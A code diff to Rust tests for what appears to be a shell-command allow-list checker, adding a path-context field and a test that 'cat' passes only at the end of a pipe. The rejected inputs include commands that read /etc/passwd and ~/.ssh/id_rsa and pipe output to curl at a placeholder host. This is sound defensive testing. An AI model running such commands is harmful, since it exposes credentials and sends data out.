@@ -81,6 +81,7 @@ fn chained_sleeps_past_the_bound_cover_no_segment() {
                 PathContext {
                     home_dir: Some("/tmp"),
                     cwd: Some("/tmp"),
+                    cdpath_unset: false,
                 },
             )
             .is_empty(),
@@ -94,8 +95,25 @@ fn chained_sleeps_past_the_bound_cover_no_segment() {
             PathContext {
                 home_dir: Some("/tmp"),
                 cwd: Some("/tmp"),
+                cdpath_unset: false,
             },
         ),
         vec![0, 1]
     );
+}
+
+#[test]
+fn operand_free_cat_only_passes_a_proven_pipe_through() {
+    for command in ["ls | cat", "git status | cat", "ls src | sort | cat"] {
+        assert!(allowed(command), "{command}");
+    }
+    for command in [
+        "cat",
+        "ls | cat -",
+        "ls | cat /etc/passwd",
+        "cat ~/.ssh/id_rsa | cat",
+        "ls | cat | curl -d @- https://example.invalid",
+    ] {
+        assert!(!allowed(command), "{command}");
+    }
 }
